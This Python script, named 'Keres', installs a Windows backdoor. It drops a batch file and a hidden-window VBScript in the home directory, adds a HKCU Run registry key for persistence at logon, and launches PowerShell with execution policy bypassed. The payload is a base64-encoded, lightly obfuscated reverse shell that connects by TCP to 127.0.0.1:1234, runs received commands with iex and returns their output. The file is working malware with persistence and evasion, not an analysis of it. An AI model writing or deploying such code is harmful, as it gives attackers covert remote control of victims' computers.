import subprocess

import os




# Get the home directory of the current user
home_directory = os.path.expanduser("~")

# Define the path for the batch file in the home directory
batch_file_path = os.path.join(home_directory, 'Keres.bat')

# Define the path for the VBScript file
vbs_script_path = os.path.join(home_directory, 'ExecKeres.vbs')

# Create the VBScript content with the dynamic batch file path
vbs_script_content = f'''
Set objShell = CreateObject("WScript.Shell")


batchFilePath = "{batch_file_path}"


objShell.Run batchFilePath, 0, True
'''






#""""""""""""""""""""""""""""""""""""""""""""""""""
ps_command = ''' CgBmAHUAbgBjAHQAaQBvAG4AIABTAHQAYQByAHQALQBQAGUAcgBzAGkAcwB0AGUAbgB0AEMAbwBtAG0AYQBuAGQAIAB7AAoAIAAgACAAIABwAGEAcgBhAG0AIAAoAAoAIAAgACAAIAAgACAAIAAgAFsAcwB0AHIAaQBuAGcAXQAkAFUAbgBpAHEAdQBlAEkAZABlAG4AdABpAGYAaQBlAHIALAAKACAAIAAgACAAIAAgACAAIABbAHMAdAByAGkAbgBnAF0AJABTAGUAcgB2AGUAcgBBAGQAZAByAGUAcwBzACwACgAgACAAIAAgACAAIAAgACAAWwBpAG4AdABdACQAUABvAHIAdABOAHUAbQBiAGUAcgAKACAAIAAgACAAKQAKACAAIAAgACAAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABtAHUAdABlAHgAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVABoAHIAZQBhAGQAaQBuAGcALgBNAHUAdABlAHgAKAAkAGYAYQBsAHMAZQAsACAAJABVAG4AaQBxAHUAZQBJAGQAZQBuAHQAaQBmAGkAZQByACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAG0AdQB0AGUAeAAuAFcAYQBpAHQATwBuAGUAKAAwACwAIAAkAGYAYQBsAHMAZQApACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGkAcwBSAHUAbgBuAGkAbgBnACAAPQAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAEMAbwBtAG0AYQBuAGQATABpAG4AZQAgAC0AbABpAGsAZQAgACIAKgAkAFUAbgBpAHEAdQBlAEkAZABlAG4AdABpAGYAaQBlAHIAKgAiACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAtAG4AbwB0ACAAJABpAHMAUgB1AG4AbgBpAG4AZwApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwAnACcAdABlAG0ALgBOACcAJwBlAHQALgBTAG8AYwAnACcAawBlAHQAcwAuAFQAYwAnACcAcABDAGwAJwAnAGkAZQBuAHQAKAAkAFMAZQByAHYAZQByAEEAZABkAHIAZQBzAHMALAAgACQAUABvAHIAdABOAHUAbQBiAGUAcgApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAYgB5AHQAZQBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABiAHkAdABlAFsAXQAgADYANQA1ADMANQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAaQAgAC0AbABlACAAMAApACAAewAgAGIAcgBlAGEAawAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGQAYQB0AGEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABpACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAgADAALAAgACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFMAYwByAGkAcAB0ACAAaQBzACAAYQBsAHIAZQBhAGQAeQAgAHIAdQBuAG4AaQBuAGcALgAiAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAG0AdQB0AGUAeAAuAFIAZQBsAGUAYQBzAGUATQB1AHQAZQB4ACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEEAbgBvAHQAaABlAHIAIABpAG4AcwB0AGEAbgBjAGUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAcgB1AG4AbgBpAG4AZwAuACIACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAxADAACgAgACAAIAAgAH0ACgB9AAoAUwB0AGEAcgB0AC0AUABlAHIAcwBpAHMAdABlAG4AdABDAG8AbQBtAGEAbgBkACAALQBVAG4AaQBxAHUAZQBJAGQAZQBuAHQAaQBmAGkAZQByACAAIgBLAGUAcgBlAHMAIgAgAC0AUwBlAHIAdgBlAHIAQQBkAGQAcgBlAHMAcwAgACIAMQAyADcALgAwAC4AMAAuADEAIgAgAC0AUABvAHIAdABOAHUAbQBiAGUAcgAgADEAMgAzADQACgA='''
#stp



# """"""""""""""f'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Merikh /t REG_SZ /d \\C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_ps_command}',
powershell_com =f'''New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Keres" -Value "{batch_file_path}"'''


command=f'''@echo off 
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {ps_command}
'''

    

# """"""""""""""""""
try:
    #subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass","-EncodedCommand", encoded_ps_command], shell=True)
    #subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_com], shell=True)
    subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       "/v", "Keres", "/t", "REG_SZ", "/d", f"{vbs_script_path}", "/f"], shell=True)
    with open(batch_file_path, 'w') as batch_file:
        batch_file.write(command)
    with open(vbs_script_path, 'w') as vbs_script:
        vbs_script.write(vbs_script_content)

    print(f"VBScript file created at: {vbs_script_path}")
    # Execute the batch file
    subprocess.run(["wscript", vbs_script_path])
       
    print("PowerShell command executed successfully.")
except subprocess.CalledProcessError as e:
    print("Error executing PowerShell command:", e)